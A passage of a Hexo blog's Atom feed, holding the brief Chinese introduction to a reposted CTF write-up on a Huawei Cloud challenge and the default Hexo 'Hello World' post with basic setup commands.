data-src="https://cdn.annevi.cn/image-20201228105113374.png" class="lozad post-image"></p><p>之前学习云原生架构和安全相关知识的时候，一直找不到一个很好的实践方式，而这次华为云专场比赛CLOUD第一次让我接触到了真正的☁️云环境下的安全问题，虽说是通过非预期的方式解出了题目，不过这个非预期却让我们较为容易的拿到了整个集群的最高权限，还是挺意外的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;转载自 Annevi&lt;/p&gt;
&lt;p&gt;当时打比赛的时候觉得这是个很有意思的过程&lt;/p&gt;
&lt;p&gt;转载记录一下&lt;/p&gt;
&lt;h2 id=&quot;0x00-</summary>
      
    
    
    
    
    <category term="CTF WriteUp" scheme="https://me.liki.link/tags/CTF-WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://me.liki.link/20201001/hello-world/"/>
    <id>https://me.liki.link/20201001/hello-world/</id>
    <published>2020-09-30T16:00:00.000Z</published>
    <updated>2021-10-18T02:54:55.806Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
